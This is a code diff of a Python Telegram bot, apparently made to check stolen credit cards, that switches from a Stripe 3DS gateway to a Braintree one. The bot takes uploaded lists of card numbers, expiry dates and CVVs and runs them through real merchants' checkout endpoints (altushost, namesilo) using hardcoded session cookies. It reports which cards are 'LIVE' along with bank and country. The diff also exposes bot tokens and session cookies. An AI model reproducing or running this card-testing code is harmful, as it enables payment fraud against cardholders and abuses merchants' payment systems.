@@ -3,13 +3,13 @@
 import telebot
 from telebot import types
 import requests
-from bs4 import BeautifulSoup
+import json
+import base64
 import time
 from typing import Dict, List, Tuple
 import threading
 
-# بيانات البوت
-TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
+TOKEN = "8166484030:AAGiBsKby2GF0ykoxvkKMHCu80lHUIfD6xg"
 ADMIN_ID = 5895491379
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
@@ -18,414 +18,276 @@ bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 user_cards = {}
 checking_status = {}
 
-# ألوان للطباعة
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-RED = "\033[91m"
-WHITE = "\033[97m"
-RESET = "\033[0m"
-
-# فحص Luhn Algorithm
-def luhn_check(card_number):
-    digits = [int(d) for d in card_number if d.isdigit()]
-    checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
-    return checksum % 10 == 0
-
-# كلاس لفحص الكروت باستخدام Stripe
-class StripeChecker:
+class BraintreeChecker:
     def __init__(self):
-        self.public_key = None
-        self.client_secret = None
-        self.cookies = None
-        self.headers = None
-        self.stripe_headers = None
-        self.check_count = 0
-        self.session_refresh_count = 0
-        self.consecutive_na_count = 0  # عداد N/A المتتالية
-        self.wait_time = 60  # وقت الانتظار (يبدأ من دقيقة)
-        self.max_wait_time = 3600  # الحد الأقصى للانتظار (ساعة)
-        self.initialize_session()
-
-    def initialize_session(self):
-        """تهيئة الجلسة الجديدة مع كوكيز وهيدرز جديدة"""
-        print(f"{YELLOW}🔄 Initializing new session...{RESET}")
-        
-        current_time = int(time.time())
-        
-        # كوكيز جديدة ديناميكية
         self.cookies = {
-            '_gcl_au': f'1.1.{current_time}{current_time % 1000}',
-            '_ga': f'GA1.2.{current_time}{current_time % 10000}',
-            '_gid': f'GA1.2.{current_time + 100}{current_time % 5000}',
-            '_fbp': f'fb.1.{current_time}.{current_time * 2}',
-            '_ga_L9P8FSN26L': f'GS2.1.s{current_time}$o1$g0$t{current_time + 50}$j60$l0$h0',
-            '__adroll_fpc': f'{hex(current_time)[2:]}-{current_time}',
-            'SESSID96d7': hex(current_time * 1000)[2:],
-            '__stripe_mid': f'{hex(current_time)[2:]}-{hex(current_time + 100)[2:]}',
-            '__stripe_sid': f'{hex(current_time)[2:]}-{hex(current_time + 200)[2:]}',
-            'Cart-Session': hex(current_time * 1000)[2:],
+    '_ga': 'GA1.1.1722861085.1760331033',
+    '_fbp': 'fb.1.1760331033259.683801318978821414',
+    'wasLoggedIn': '1',
+    'device_1629404': 'ea88c336-80d4-435e-a2f7-50901bd267f6',
+    'cookies-consent': 'necessary%3Ayes%2Cfunctional%3Ayes%2Canalytics%3Ayes%2Cperformance%3Ayes%2Cadvertisement%3Ayes%2Cuncategorised%3Ayes',
+    'device_1630303': 'f5cfa990-7aa1-4612-b0a9-3a68d8cdae0d',
+    'device_1632436': '08a0ce0e-4965-4305-b1e0-8b205f64fdf1',
+    '_cfuvid': '6q484WF_yXn8hMlKWQtF1O.jV75SwhYvvANYmUYx81Q-1761062452747-0.0.1.1-604800000',
+    '__cf_bm': '5jiPIhfrntOCG113R0_kJm2LyNObt5iXmUB7wFDtnME-1761065246-1.0.1.1-DrrGAbjinQPTgKPALNI8TP5Qr5u991KFZ_rcRlP.sRBXNq9cH8UZmgg76G0TrpTH1mLLYbspReZBBYPPoLJfj8uR15ilzVmg3x9TKXIUWRBugXH5JwYJ2nwy_pFjSPx9',
+    '_li_ns': '1',
+    'device_1634092': '2fdb9f3a-0b9e-4051-96d1-bdcc13fe332e',
+    '_gcl_au': '1.1.2109561485.1760331033.626465045.1761065264.1761065342',
+    'PHPSESSID': '533b24553fb631c354a68f091962c3c2',
+    '_identity': '%5B1634093%2C%22%22%2C1800%5D',
+    'device_1634093': 'be5e622b-aefc-4a13-9c78-096cd9b8deb0',
+    'cf_clearance': '5Y4m141j70eppUGrRttW8JOFwdxaP_AMsGcPcbS2pEs-1761065347-1.2.1.1-KTYJuSz0cEJiXjyOwVoXP3bRTpk8wWZ3lE8BgfjM9Ob6xIW07ZglV2RBeKpQgAhrynDwSEI_d9xjqV8VWy.x4mezepNMxyKBVpLEI5XDWcvxrLZ.OWzvi.xZwQOasQQD2C9OyJjwP21vtzYFwQRfjDG0OdwqUtwsWD6esfmsEAAR5W5A3Tpj_su2GuEpsHULviJTNOxHkeUWcyhTUEjwbytoWz5ORgNClK.bw0xN0HI',
+    'cfz_zaraz-analytics': '%7B%22_cfa_clientId%22%3A%7B%22v%22%3A%2222099663457815076%22%2C%22e%22%3A1791867032539%7D%2C%22_cfa_sId%22%3A%7B%22v%22%3A%2269393253534430220%22%2C%22e%22%3A1761067181488%7D%7D',
+    '_csrf': '7ywDRXuJfUVm1iPIvwfuNLSxdIsAduvpBZNxAhzv2XefQUF0M88oaBS7T6fVbYNs1vwk7FIFrrNR1QN2TJeJOQ%3D%3D',
+    '_ga_5WDMLTHHFH': 'GS2.1.s1761065249$o7$g1$t1761065483$j60$l0$h142749829',
         }
-
-        # هيدرز ديناميكية
-        self.headers = {
-            'accept': '*/*',
-            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-            'referer': 'https://cp.altushost.com/?/cart/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-            'x-csrf-token': hex(current_time * 1000)[2:],
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        self.stripe_headers = {
-            'accept': 'application/json',
-            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dnt': '1',
-            'origin': 'https://js.stripe.com',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="133", "Google Chrome";v="133"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-        }
-
-        self.check_count = 0
-        self.session_refresh_count += 1
-        print(f"{GREEN}✅ Session #{self.session_refresh_count} initialized!{RESET}")
-
-    def fetch_stripe_keys(self) -> bool:
-        """جلب مفاتيح Stripe جديدة"""
-        params = {'cmd': 'stripe_intents_3dsecure', 'action': 'cart'}
+        self.auth_fingerprint = None
         
-        for attempt in range(3):
-            try:
-                print(f"{YELLOW}🔑 Fetching new Stripe keys (attempt {attempt + 1})...{RESET}")
-                
-                response = requests.get(
-                    'https://cp.altushost.com/', 
-                    params=params, 
-                    cookies=self.cookies, 
-                    headers=self.headers,
-                    timeout=15
-                )
-                
-                soup = BeautifulSoup(response.text, "html.parser")
-                script_tags = soup.find_all("script")
-                
-                important_values = {}
-                for script in script_tags:
-                    if "Stripe(" in script.text:
-                        if "Stripe('" in script.text:
-                            start = script.text.find("Stripe('") + len("Stripe('")
-                            end = script.text.find("')", start)
-                            important_values["public_key"] = script.text[start:end]
-                        if "handleCardSetup(" in script.text:
-                            start = script.text.find("handleCardSetup(") + len("handleCardSetup(")
-                            part = script.text[start:].split(",")[0]
-                            important_values["client_secret"] = part.strip().strip('"')
-                
-                if not important_values.get("client_secret"):
-                    raise ValueError("Failed to extract client_secret")
-                    
-                self.public_key = important_values.get("public_key", "pk_live_88NPqxaecGYmZwJqsjzbKJkn")
-                self.client_secret = important_values["client_secret"]
-                
-                print(f"{GREEN}✅ Keys fetched successfully!{RESET}")
-                print(f"{WHITE}   Public Key: {self.public_key[:30]}...{RESET}")
-                print(f"{WHITE}   Client Secret: {self.client_secret[:30]}...{RESET}")
-                return True
-                
-            except Exception as e:
-                print(f"{RED}❌ Attempt {attempt + 1} failed: {str(e)}{RESET}")
-                if attempt < 2:
-                    time.sleep(2 ** attempt)
-                    continue
-                return False
-        
-        return False
-
-    def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
-        """فحص الكرت مع جلب client_secret جديد لكل فحص"""
-        time.sleep(1.5)
-        start_time = time.time()
-        
-        # زيادة العداد
-        self.check_count += 1
-        
-        # تجديد الجلسة كل 10 فحوصات
-        if self.check_count > 1 and self.check_count % 10 == 1:
-            print(f"{YELLOW}🔄 Refreshing session after {self.check_count - 1} checks...{RESET}")
-            self.initialize_session()
-
-        # فحص Luhn
-        if not luhn_check(card['number']):
+    def get_auth_keys(self) -> bool:
+        try:
+            headers = {
+                'accept': 'application/json, text/plain, */*',
+                'referer': 'https://www.namesilo.com/cart/checkout',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            }
+            
+            response = requests.get(
+                'https://www.namesilo.com/account/api/braintree/keys',
+                cookies=self.cookies,
+                headers=headers,
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                text = response.text.strip().strip('"')
+                decoded = base64.b64decode(text).decode('utf-8')
+                data = json.loads(decoded)
+                self.auth_fingerprint = data.get('authorizationFingerprint')
+                return bool(self.auth_fingerprint)
+            return False
+        except:
+            return False
+    
+    def tokenize_card(self, card: Dict) -> Tuple[str, Dict]:
+        try:
+            headers = {
+                'accept': '*/*',
+                'authorization': f'Bearer {self.auth_fingerprint}',
+                'braintree-version': '2018-05-10',
+                'content-type': 'application/json',
+                'origin': 'https://assets.braintreegateway.com',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            }
+            
+            json_data = {
+                'clientSdkMetadata': {
+                    'source': 'client',
+                    'integration': 'custom',
+                    'sessionId': '8f55664e-6642-423a-8a18-b5e050ff2b0b',
+                },
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         issuingBank         countryOfIssuance       }     }   } }',
+                'variables': {
+                    'input': {
+                        'creditCard': {
+                            'number': card['number'],
+                            'expirationMonth': card['month'],
+                            'expirationYear': card['year'],
+                            'cvv': card['cvv'],
+                            'cardholderName': 'Card Holder',
+                        },
+                        'options': {'validate': False},
+                    },
+                },
+                'operationName': 'TokenizeCreditCard',
+            }
+            
+            response = requests.post(
+                'https://payments.braintree-api.com/graphql',
+                headers=headers,
+                json=json_data,
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                if 'data' in data and data['data'].get('tokenizeCreditCard'):
+                    token_info = data['data']['tokenizeCreditCard']
+                    return token_info.get('token'), token_info.get('creditCard', {})
+            return None, {}
+        except:
+            return None, {}
+    
+    def check_3ds(self, token: str, bin_num: str) -> Dict:
+        try:
+            headers = {
+                'accept': '*/*',
+                'content-type': 'application/json',
+                'origin': 'https://www.namesilo.com',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            }
+            
+            json_data = {
+                'amount': 31.27,
+                'additionalInfo': {
+                    'billingLine1': '111 North Street',
+                    'billingCity': 'Napoleon',
+                    'billingState': 'State',
+                    'billingPostalCode': '49261',
+                    'billingCountryCode': 'EG',
+                    'mobilePhoneNumber': '13609990000',
+                },
+                'bin': bin_num[:6],
+                'dfReferenceId': '0_040e2574-e8a7-4ce8-a578-da01dc73003d',
+                'clientMetadata': {
+                    'requestedThreeDSecureVersion': '2',
+                    'sdkVersion': 'web/3.124.0',
+                    'cardinalDeviceDataCollectionTimeElapsed': 346,
+                    'issuerDeviceDataCollectionTimeElapsed': 3581,
+                    'issuerDeviceDataCollectionResult': True,
+                },
+                'authorizationFingerprint': self.auth_fingerprint,
+                'braintreeLibraryVersion': 'braintree/web/3.124.0',
+                '_meta': {
+                    'merchantAppId': 'www.namesilo.com',
+                    'platform': 'web',
+                    'sdkVersion': '3.124.0',
+                    'source': 'client',
+                    'integration': 'custom',
+                    'integrationType': 'custom',
+                    'sessionId': '8f55664e-6642-423a-8a18-b5e050ff2b0b',
+                },
+            }
+            
+            response = requests.post(
+                f'https://api.braintreegateway.com/merchants/mfzfqnyzf9cs22b5/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
+                headers=headers,
+                json=json_data,
+                timeout=30
+            )
+            
+            if response.status_code in [200, 201]:
+                data = response.json()
+                return data
+            return {'error': 'Lookup Error'}
+        except:
+            return {'error': 'Lookup Error'}
+    
+    def analyze_result(self, result_data: Dict, card_info: Dict) -> Dict:
+        if 'error' in result_data and result_data['error'] == 'Lookup Error':
             return {
                 'status': 'ERROR',
-                'message': 'Invalid card number (Luhn check failed)',
+                'message': 'Lookup Error',
+                'details': {}
+            }
+        
+        if not result_data or 'paymentMethod' not in result_data:
+            return {
+                'status': 'ERROR',
+                'message': 'Connection Failed',
+                'details': {}
+            }
+        
+        three_ds = result_data.get('paymentMethod', {}).get('threeDSecureInfo', {})
+        lookup = result_data.get('lookup', {})
+        
+        status = three_ds.get('status', '').lower()
+        liability = three_ds.get('liabilityShifted', False)
+        acs_url = lookup.get('acsUrl')
+        enrolled = three_ds.get('enrolled', 'U')
+        
+        bank = card_info.get('binData', {}).get('issuingBank', 'Unknown Bank')
+        country = card_info.get('binData', {}).get('countryOfIssuance', 'XX')
+        card_type = card_info.get('brandCode', 'Unknown')
+        bin_code = card_info.get('bin', 'N/A')
+        
+        country_emoji = {
+            'USA': '🇺🇸', 'ITA': '🇮🇹', 'GBR': '🇬🇧', 'CAN': '🇨🇦', 
+            'FRA': '🇫🇷', 'DEU': '🇩🇪', 'ESP': '🇪🇸', 'BRA': '🇧🇷',
+            'MEX': '🇲🇽', 'IND': '🇮🇳', 'CHN': '🇨🇳', 'JPN': '🇯🇵',
+            'AUS': '🇦🇺', 'NLD': '🇳🇱', 'BEL': '🇧🇪', 'CHE': '🇨🇭',
+            'SWE': '🇸🇪', 'NOR': '🇳🇴', 'DNK': '🇩🇰', 'FIN': '🇫🇮',
+            'POL': '🇵🇱', 'RUS': '🇷🇺', 'TUR': '🇹🇷', 'EGY': '🇪🇬',
+            'SAU': '🇸🇦', 'ARE': '🇦🇪', 'QAT': '🇶🇦', 'KWT': '🇰🇼'
+        }
+        
+        emoji = country_emoji.get(country, '🏳️')
+        
+        details = {
+            'bank': bank,
+            'country': country,
+            'emoji': emoji,
+            'type': card_type,
+            'bin': bin_code,
+            'status_3ds': status,
+            'liability': liability,
+            'enrolled': enrolled
+        }
+        
+        if status in ['authenticate_successful', 'authenticate_attempt_successful'] and liability:
+            return {
+                'status': 'LIVE',
+                'message': '✅ Charged Successfully',
+                'details': details
+            }
+        
+        if acs_url and enrolled == 'Y' and status in ['authentication_unavailable', 'lookup_complete']:
+            return {
+                'status': 'OTP',
+                'message': '🔐 OTP Required',
+                'details': details
+            }
+        
+        if status in ['authenticate_rejected', 'failed', 'unavailable']:
+            return {
+                'status': 'DECLINED',
+                'message': '❌ Declined',
+                'details': details
+            }
+        
+        if 'bypass' in status or enrolled == 'N':
+            return {
+                'status': 'APPROVED',
+                'message': '✓ Approved (No 3DS)',
+                'details': details
+            }
+        
+        if status == 'authenticate_attempt_successful' and not liability:
+            return {
+                'status': 'APPROVED',
+                'message': '✓ Approved (No CVV)',
+                'details': details
+            }
+        
+        return {
+            'status': 'ERROR',
+            'message': f'❔ Unknown Status: {status}',
+            'details': details
+        }
+    
+    def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
+        time.sleep(1.5)
+        
+        start_time = time.time()
+        token, card_info = self.tokenize_card(card)
+        
+        if not token:
+            if retry_count < 2:
+                time.sleep(2)
+                if self.get_auth_keys():
+                    return self.check_card(card, retry_count + 1)
+            
+            return {
+                'status': 'ERROR',
+                'message': 'Tokenization Failed',
                 'details': {},
                 'time': round(time.time() - start_time, 2)
             }
-
-        # جلب client_secret جديد لكل فحص
-        print(f"{YELLOW}📋 Check #{self.check_count}: Fetching fresh client_secret...{RESET}")
-        if not self.fetch_stripe_keys():
-            if retry_count < 2:
-                print(f"{YELLOW}⚠️ Retrying... (attempt {retry_count + 2})...{RESET}")
-                time.sleep(2)
-                return self.check_card(card, retry_count + 1)
-            return {
-                'status': 'ERROR',
-                'message': 'Failed to fetch client_secret',
-                'details': {'check_number': self.check_count},
-                'time': round(time.time() - start_time, 2)
-            }
-
-        try:
-            current_time = int(time.time())
-            
-            # أول طلب: تأكيد Setup Intent
-            for attempt in range(3):
-                try:
-                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]={hex(current_time)[2:]}&payment_method_data[muid]={self.cookies["__stripe_mid"]}&payment_method_data[sid]={self.cookies["__stripe_sid"]}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]={current_time}&payment_method_data[client_attribution_metadata][client_session_id]={hex(current_time)[2:]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_secret={self.client_secret}'
-                    
-                    response = requests.post(
-                        f'https://api.stripe.com/v1/setup_intents/{self.client_secret.split("_secret_")[0]}/confirm',
-                        headers=self.stripe_headers,
-                        data=data,
-                        timeout=20
-                    )
-                    setup_intent = response.json()
-                    break
-                except Exception as e:
-                    if attempt < 2:
-                        time.sleep(2 ** attempt)
-                        continue
-                    return {
-                        'status': 'ERROR',
-                        'message': f'Setup Intent Error - {str(e)}',
-                        'details': {'check_number': self.check_count},
-                        'time': round(time.time() - start_time, 2)
-                    }
-
-            if 'error' in setup_intent:
-                error_msg = setup_intent["error"].get("message", "Unknown error")
-                error_type = setup_intent["error"].get("type", "unknown")
-                error_code = setup_intent["error"].get("code", "unknown")
-                
-                print(f"{RED}❌ Setup Intent Error: {error_msg}{RESET}")
-                
-                # التعامل مع أخطاء 3DS2
-                if "3D Secure 2 is not supported" in error_msg or "3D Secure" in error_msg:
-                    return {
-                        'status': 'DECLINED',
-                        'message': '❌ Card Not Supported (3DS2 Issue)',
-                        'details': {
-                            'check_number': self.check_count,
-                            'status_3ds': 'Not Supported',
-                            'error_type': error_type
-                        },
-                        'time': round(time.time() - start_time, 2)
-                    }
-                
-                # أخطاء البطاقة المرفوضة
-                if error_code in ['card_declined', 'insufficient_funds', 'lost_card', 'stolen_card']:
-                    return {
-                        'status': 'DECLINED',
-                        'message': f'❌ Card Declined - {error_msg}',
-                        'details': {
-                            'check_number': self.check_count,
-                            'status_3ds': 'Declined',
-                            'error_code': error_code
-                        },
-                        'time': round(time.time() - start_time, 2)
-                    }
-                
-                # باقي الأخطاء
-                return {
-                    'status': 'ERROR',
-                    'message': f'Setup Intent Error - {error_msg}',
-                    'details': {
-                        'check_number': self.check_count,
-                        'error_type': error_type,
-                        'error_code': error_code
-                    },
-                    'time': round(time.time() - start_time, 2)
-                }
-
-            if setup_intent.get('status') == 'requires_action' and setup_intent.get('next_action', {}).get('type') == 'use_stripe_sdk':
-                three_d_secure_source = setup_intent.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
-
-                # ثاني طلب: تصديق 3DS2
-                for attempt in range(3):
-                    try:
-                        data = f'source={three_d_secure_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={self.public_key}'
-                        
-                        response = requests.post(
-                            'https://api.stripe.com/v1/3ds2/authenticate', 
-                            headers=self.stripe_headers, 
-                            data=data,
-                            timeout=20
-                        )
-                        three_ds_response = response.json()
-                        
-                        # التحقق من وجود خطأ في الـ 3DS2
-                        if 'error' in three_ds_response:
-                            error_msg = three_ds_response['error'].get('message', 'Unknown error')
-                            print(f"{RED}❌ 3DS2 Error: {error_msg}{RESET}")
-                            
-                            if "3D Secure 2 is not supported" in error_msg or "not supported" in error_msg:
-                                return {
-                                    'status': 'DECLINED',
-                                    'message': '❌ 3DS2 Not Supported',
-                                    'details': {
-                                        'check_number': self.check_count,
-                                        'status_3ds': 'Not Supported'
-                                    },
-                                    'time': round(time.time() - start_time, 2)
-                                }
-                        
-                        break
-                    except Exception as e:
-                        if attempt < 2:
-                            time.sleep(2 ** attempt)
-                            continue
-                        return {
-                            'status': 'ERROR',
-                            'message': f'3DS2 Error - {str(e)}',
-                            'details': {'check_number': self.check_count},
-                            'time': round(time.time() - start_time, 2)
-                        }
-
-                trans_status = three_ds_response.get('ares', {}).get('transStatus')
-                acs_url = three_ds_response.get('ares', {}).get('acsURL')
-                
-                # لو ما فيش status يبقى في مشكلة
-                if not trans_status and not three_ds_response.get('ares'):
-                    print(f"{RED}❌ No 3DS response data (N/A){RESET}")
-                    self.consecutive_na_count += 1
-                    
-                    return {
-                        'status': 'NA',
-                        'message': '❌ N/A - No Response Data',
-                        'details': {
-                            'check_number': self.check_count,
-                            'status_3ds': 'N/A',
-                            'session_number': self.session_refresh_count,
-                            'na_count': self.consecutive_na_count
-                        },
-                        'time': round(time.time() - start_time, 2)
-                    }
-
-                details = {
-                    'status_3ds': trans_status or 'N/A',
-                    'check_number': self.check_count,
-                    'session_number': self.session_refresh_count
-                }
-                
-                print(f"{WHITE}🔐 3DS Status: {trans_status or 'N/A'}{RESET}")
-                
-                # إعادة تعيين عداد N/A عند النجاح
-                if trans_status:
-                    self.consecutive_na_count = 0
-                    self.wait_time = 60  # إعادة تعيين وقت الانتظار
-                
-                if trans_status == 'Y':
-                    print(f"{GREEN}✅ LIVE CARD FOUND!{RESET}")
-                    return {
-                        'status': 'LIVE',
-                        'message': '✅ Card Approved',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status == 'N':
-                    print(f"{GREEN}✅ CVV MATCH!{RESET}")
-                    return {
-                        'status': 'LIVE',
-                        'message': '✅ CCN Approved',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status == 'A':
-                    print(f"{GREEN}✅ APPROVED!{RESET}")
-                    return {
-                        'status': 'LIVE',
-                        'message': '✅ Authentication Attempted',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status in ('C', 'R') and acs_url:
-                    print(f"{YELLOW}🔐 OTP Required{RESET}")
-                    return {
-                        'status': 'OTP',
-                        'message': '🔐 OTP Required',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status in ('C', 'R') and not acs_url:
-                    print(f"{RED}❌ Card Rejected{RESET}")
-                    return {
-                        'status': 'DECLINED',
-                        'message': '❌ Card Rejected',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                elif trans_status == 'U':
-                    print(f"{YELLOW}⚠️ Unable to Authenticate{RESET}")
-                    return {
-                        'status': 'DECLINED',
-                        'message': '⚠️ Unable to Authenticate',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                else:
-                    print(f"{RED}❓ Unknown Status: {trans_status}{RESET}")
-                    self.consecutive_na_count += 1
-                    
-                    return {
-                        'status': 'NA',
-                        'message': f'❓ Unknown Status: {trans_status}',
-                        'details': {
-                            **details,
-                            'na_count': self.consecutive_na_count
-                        },
-                        'time': round(time.time() - start_time, 2)
-                    }
-            else:
-                details = {
-                    'status_3ds': setup_intent.get('status', 'N/A'),
-                    'check_number': self.check_count,
-                    'session_number': self.session_refresh_count
-                }
-                
-                if setup_intent.get('status') == 'succeeded':
-                    print(f"{GREEN}✅ Setup Intent Succeeded!{RESET}")
-                    return {
-                        'status': 'LIVE',
-                        'message': '✅ Setup Intent Confirmed Successfully',
-                        'details': details,
-                        'time': round(time.time() - start_time, 2)
-                    }
-                
-                print(f"{RED}❌ Setup Intent Failed: {setup_intent.get('status')}{RESET}")
-                return {
-                    'status': 'ERROR',
-                    'message': 'Further Action Required or Setup Intent Failed',
-                    'details': details,
-                    'time': round(time.time() - start_time, 2)
-                }
-                
-        except Exception as e:
-            print(f"{RED}❌ Exception: {str(e)}{RESET}")
-            return {
-                'status': 'ERROR',
-                'message': f'Error - {str(e)}',
-                'details': {'check_number': self.check_count, 'session_number': self.session_refresh_count},
-                'time': round(time.time() - start_time, 2)
-            }
+        
+        result = self.check_3ds(token, card['number'])
+        result_data = self.analyze_result(result, card_info)
+        result_data['time'] = round(time.time() - start_time, 2)
+        
+        return result_data
 
 # Bot Handlers
 @bot.message_handler(commands=['start'])
@@ -433,16 +295,14 @@ def start_message(message):
     username = message.from_user.first_name or "User"
     welcome_text = f"""<b>🎉 Welcome {username}!
 
-🔥 Stripe 3DS Checker Bot 🔥
+🔥 Braintree 3DS Checker Bot 🔥
 ━━━━━━━━━━━━━━━━━━━━
 ✅ Fast & Accurate Checking
 📊 Real-time Results  
 🔒 Secure Processing
 💳 Only LIVE Cards Sent
-🔄 Fresh Keys Every Check
-🔄 Session Refresh Every 10 Checks
 
-📤 Send your combo file or card details to start checking!
+📤 Send your combo file to start checking!
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -486,9 +346,7 @@ def handle_document(message):
             text=f"""<b>✅ File Uploaded Successfully!
 ━━━━━━━━━━━━━━━━━━━━
 💳 Total Cards: {cc_count}
-🔥 Gateway: Stripe 3DS
-🔄 Fresh Keys: Every Check
-🔄 Session Refresh: Every 10 Checks
+🔥 Gateway: Braintree 3DS
 ⚡ Status: Ready
 
 Click below to start checking:
@@ -497,39 +355,6 @@ Click below to start checking:
         )
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
-
-@bot.message_handler(func=lambda message: True)
-def handle_text(message):
-    text = message.text.strip()
-    if '|' in text and len(text.split('|')) == 4:
-        parts = text.split('|')
-        user_cards[message.from_user.id] = [{
-            'number': parts[0].strip(),
-            'month': parts[1].strip().zfill(2),
-            'year': parts[2].strip(),
-            'cvv': parts[3].strip(),
-            'raw': text
-        }]
-        checking_status[message.from_user.id] = False
-        
-        keyboard = types.InlineKeyboardMarkup(row_width=2)
-        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
-        
-        bot.send_message(
-            chat_id=message.chat.id,
-            text=f"""<b>✅ Card Loaded!
-━━━━━━━━━━━━━━━━━━━━
-💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
-🔥 Gateway: Stripe 3DS
-⚡ Status: Ready
-</b>""",
-            reply_markup=keyboard
-        )
-    else:
-        bot.reply_to(message, """<b>❌ Invalid format!
-Use: Card|MM|YYYY|CVV
-Example: 5127740082586858|11|2028|155
-</b>""")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'start_check')
 def start_checking(call):
@@ -556,93 +381,43 @@ def check_cards_thread(user_id, message):
     bot.edit_message_text(
         chat_id=message.chat.id,
         message_id=message.message_id,
-        text="⏳ Initializing checker...\n🔐 Getting authorization keys...\n🔄 Fresh keys will be fetched for each card"
+        text="⏳ Initializing checker...\n🔑 Getting authorization keys..."
     )
     
-    checker = StripeChecker()
+    checker = BraintreeChecker()
+    if not checker.get_auth_keys():
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=message.message_id,
+            text="❌ Failed to get authorization keys!\nPlease update cookies."
+        )
+        checking_status[user_id] = False
+        return
     
-    live = otp = declined = errors = checked = na_count = 0
+    live = approved = otp = declined = errors = checked = 0
     start_time = time.time()
-    should_stop = False
+    failed_count = 0
     
     for card in cards:
         if not checking_status.get(user_id, True):
             break
         
-        # التحقق من N/A المتتالية
-        if checker.consecutive_na_count >= 5:
-            if checker.wait_time >= checker.max_wait_time:
-                # وصلنا للحد الأقصى (ساعة) ولسه في N/A
-                bot.send_message(
-                    user_id,
-                    f"""<b>⛔ Checking Stopped!
-━━━━━━━━━━━━━━━━━━━━
-⚠️ Received 5 consecutive N/A errors
-⏱ Maximum wait time reached (1 hour)
-📊 Checked: {checked}/{total} cards
-
-The gateway might be temporarily unavailable.
-Please try again later.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-                )
-                should_stop = True
-                break
-            
-            # إرسال رسالة الانتظار
-            wait_minutes = checker.wait_time // 60
-            bot.send_message(
-                user_id,
-                f"""<b>⚠️ N/A Detection Alert!
-━━━━━━━━━━━━━━━━━━━━
-🔴 Consecutive N/A: {checker.consecutive_na_count}
-⏸ Pausing checks for {wait_minutes} minute(s)
-🔄 Will retry with fresh session...
